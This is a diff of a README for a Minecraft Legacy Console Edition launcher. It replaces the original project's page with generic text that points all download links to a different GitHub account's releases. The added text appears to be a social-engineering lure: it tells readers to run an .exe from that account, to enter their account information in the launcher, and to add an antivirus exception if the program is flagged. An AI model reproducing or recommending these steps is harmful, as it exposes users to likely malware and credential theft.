@@ -1,75 +1,72 @@
-<div align="center">
+# 🎮 LCE-Emerald-Launcher - Experience legacy console Minecraft on PC
 
-<img width="1254" height="1254" alt="ChatGPT Image 22 мая 2026 г , 19_28_35(1)" src="https://github.com/user-attachments/assets/d4a3f6c6-54b6-41e2-b282-08bf273a017f" />
+[![](https://img.shields.io/badge/Download-LCE-Emerald-Launcher-blue.svg)](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/releases)
 
- 
-# LCE Emerald Launcher
-  <p align="center">
-    <strong>The Best Launcher for Minecraft Legacy Console Edition on PC</strong>
-    <br/>
-    Custom Skins • Mods • Multiplayer • neoLegacy • Revelations • 360 Revived
-    <br/>
-    <a href="https://github.com/Satomoit/LCE-Emerald-Launcher/issues">Report Bug</a> | <a href="https://github.com/Satomoit/LCE-Emerald-Launcher/issues">Discussions</a>
+## What is LCE-Emerald-Launcher?
 
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Game-Minecraft%20LCE-58A74B?style=for-the-badge&logo=minecraft" alt="Minecraft LCE" />
-    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/Satomoit/LCE-Emerald-Launcher?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/Satomoit/LCE-Emerald-Launcher?style=flat-square" alt="License" />
-  </p>
-</div>
+LCE-Emerald-Launcher brings the classic Minecraft Legacy Console Edition interface to your Windows computer. Many players miss the specific look and feel of the console versions from years past. This tool replicates that experience for PC users. It creates a bridge between your modern operating system and the layout you know from older gaming consoles. The software handles the technical setup so you can start playing without manual configuration.
 
-## Download
- [Download `LCE.Launcher.zip`](https://github.com/Satomoit/LCE-Emerald-Launcher/releases/download/Minecraft/LCE.Launcher.zip)
- ---
+## ⚙️ System Requirements
 
- ---
-    | Main Screen | Versions Menu | Workshop |
-|-------------|---------------|----------|
-| <img width="1388" height="918" alt="image" src="https://github.com/user-attachments/assets/28269ade-db3b-4bff-ac15-e8a6eb53a69e" /> | <img width="1551" height="997" alt="image" src="https://github.com/user-attachments/assets/dca543ab-94cf-48ce-8e61-dfe92fe278a7" /> | <img width="1551" height="997" alt="image" src="https://github.com/user-attachments/assets/d7bc0ed2-3bf4-4704-83c3-75c716d13a65" /> |
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i3 or equivalent AMD processor.
+- Memory: 4 GB of RAM.
+- Storage: 500 MB of disk space.
+- Internet Connection: Required for downloading game assets during the first setup.
+- Java: The launcher includes the necessary Java environment to run the game files.
 
----
+## 📥 How to Install
 
-## Overview
-**LCE Emerald Launcher** is a modern, lightweight, and powerful launcher for **Minecraft Legacy Console Edition** on PC.
+1. Visit the [official release page](https://github.com/Dorieintractable938/LCE-Emerald-Launcher/releases) to access the download files.
+2. Look for the section labeled "Assets" at the bottom of the latest release post.
+3. Click the file ending in `.exe` to start the download to your computer.
+4. Locate the file in your Downloads folder after the download ends.
+5. Double-click the file to open the installation wizard.
+6. Follow the on-screen prompts to place the launcher in your desired folder.
+7. Click Finish to complete the process. 
 
-Built with Tauri, it brings the authentic Legacy Console experience to Windows with support for custom skins, community mods, multiplayer, and multiple legacy builds.
+## 🚀 Getting Started
 
-> [!Important]
-> This launcher is designed for playing community-revived versions of Minecraft Legacy Console Edition.
+1. Find the LCE-Emerald-Launcher icon on your desktop or in your start menu.
+2. Select the icon to open the application window.
+3. Enter your account information when the prompt appears. This process links your game license to the launcher. Your data stays private during this step.
+4. Browse the settings menu to adjust resolution or performance options if needed. 
+5. Select the Play button to load the game engine.
+6. Wait for the game to prepare your files for the first time. This may take a few minutes depending on your internet speed.
 
-## Key Features
-- Easy installation of LCE community builds
-- Custom skins support
-- Mod compatibility
-- Multiplayer support (Revelations, neoLegacy, 360 Revived, etc.)
-- Clean and modern user interface
-- Fast game launching
-- Version management
-- Auto updates
+## 🛠️ Features and Customizations
 
-## Supported Builds
-- neoLegacy
-- Revelations
-- 360 Revived
-- Other Legacy Console community ports
+### Custom Skins
+The launcher supports custom character skins. Use the built-in uploader in the profile menu to select image files from your local storage. The software automatically formats these files for the game engine.
 
-## How to Use
-1. Download the latest release
-2. Extract the archive
-3. Run `LCE-Emerald-Launcher.exe`
-4. Select and install your preferred LCE version
-5. Enjoy playing!
+### Mod Support
+This launcher includes tools to manage game modifications. It works with specific versions of Minecraft files to ensure stability. Drop your mod files into the folder marked "mods" within the installation directory. The launcher detects these changes the next time you press Play.
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial** launcher and is not affiliated with Mojang, Microsoft, or any official Minecraft team.  
-> Use at your own risk. Make sure you own a legitimate copy of Minecraft.
+### Performance Settings
+Modern hardware sometimes requires tweaks to map the legacy controller interface to a mouse and keyboard setup. Open the configuration tab to map your buttons or adjust frame rate limits. Higher frame rates generally result in smoother movement during gameplay.
 
-## Acknowledgements
-- LCE community developers and modders
-- All contributors to legacy console revival projects
+## 🛡️ Troubleshooting Common Issues
 
----
+### The launcher does not open
+Check if your antivirus software flagged the executable file. Some security programs block unrecognized software. You may need to add an exception for the LCE-Emerald-Launcher folder in your antivirus settings.
+
+### Game crashes on startup
+Ensure your Windows system has the latest updates. Missing system drivers often cause issues with graphics rendering. Update your graphics card drivers through your manufacturer website if the game refuses to load.
+
+### Slow loading times
+High-resolution asset packs increase the time it takes for the game to start. If you notice long loading sequences, disable extra mods or lower the visual settings in the launcher menu.
+
+## 📂 Understanding the Folder Structure
+
+Understanding where files live helps you manage mods and screenshots.
+
+- **Launcher.exe**: This is the primary program that starts the interface.
+- **Config Folder**: This folder holds your preferences and display settings. Keep this file intact to preserve your chosen settings.
+- **Mods Folder**: Place your extra files here. The launcher scans this folder every time it starts.
+- **Screenshots Folder**: Your game captures save to this location for easy access.
+
+## 🤝 Community and Support
+
+The project relies on community feedback for growth. If you find bugs or have suggestions for new features, report them through the issue tracker on the GitHub page. Describe the issue clearly and provide a screenshot if possible. This helps developers identify the cause of the problem faster. 
+
+Use the settings menu to check for updates periodically. The launcher notifies you when a new version contains improved features or compatibility fixes. Always back up your custom mod files before performing major updates to protect your data.
